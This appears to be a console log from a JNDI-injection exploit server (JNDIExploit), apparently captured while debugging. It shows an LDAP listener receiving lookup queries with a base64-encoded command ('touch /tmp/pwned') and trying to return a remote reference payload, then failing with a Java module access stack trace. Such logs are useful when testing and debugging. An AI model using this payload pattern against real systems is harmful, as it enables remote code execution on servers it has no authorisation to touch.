[+] LDAP Server Start Listening on 1389...
[+] HTTP Server Start Listening on 8888...
[+] Received LDAP Query: Basis/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=
[!] Invalid LDAP Query: Basis/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=
[+] Received LDAP Query: Basis/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=
[!] Invalid LDAP Query: Basis/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=
[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=
[+] Paylaod: command
[+] Command: touch /tmp/pwned

[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo= with basic remote reference payload
Exception in thread "LDAPListener client connection reader for connection from 10.0.2.15:38524 to 172.17.0.1:1389" java.lang.IllegalAccessError: superclass access check failed: class com.feihong.ldap.template.TomcatEchoTemplate (in unnamed module @0x619a5dff) cannot access class com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet (in module java.xml) because module java.xml does not export com.sun.org.apache.xalan.internal.xsltc.runtime to unnamed module @0x619a5dff
	at java.base/java.lang.ClassLoader.defineClass1(Native Method)
	at java.base/java.lang.ClassLoader.defineClass(ClassLoader.java:1017)
	at java.base/java.security.SecureClassLoader.defineClass(SecureClassLoader.java:150)
	at java.base/jdk.internal.loader.BuiltinClassLoader.defineClass(BuiltinClassLoader.java:862)
	at java.base/jdk.internal.loader.BuiltinClassLoader.findClassOnClassPathOrNull(BuiltinClassLoader.java:760)
	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClassOrNull(BuiltinClassLoader.java:681)
	at java.base/jdk.internal.loader.BuiltinClassLoader.loadClass(BuiltinClassLoader.java:639)
	at java.base/jdk.internal.loader.ClassLoaders$AppClassLoader.loadClass(ClassLoaders.java:188)
	at java.base/java.lang.ClassLoader.loadClass(ClassLoader.java:525)
	at com.feihong.ldap.utils.Cache.<clinit>(Cache.java:19)
	at com.feihong.ldap.template.CommandTemplate.cache(CommandTemplate.java:28)
	at com.feihong.ldap.controllers.BasicController.sendResult(BasicController.java:37)
	at com.feihong.ldap.LdapServer.processSearchResult(LdapServer.java:92)
	at com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptorRequestHandler.processSearchRequest(InMemoryOperationInterceptorRequestHandler.java:831)
	at com.unboundid.ldap.listener.StartTLSRequestHandler.processSearchRequest(StartTLSRequestHandler.java:309)
	at com.unboundid.ldap.listener.LDAPListenerClientConnection.run(LDAPListenerClientConnection.java:582)
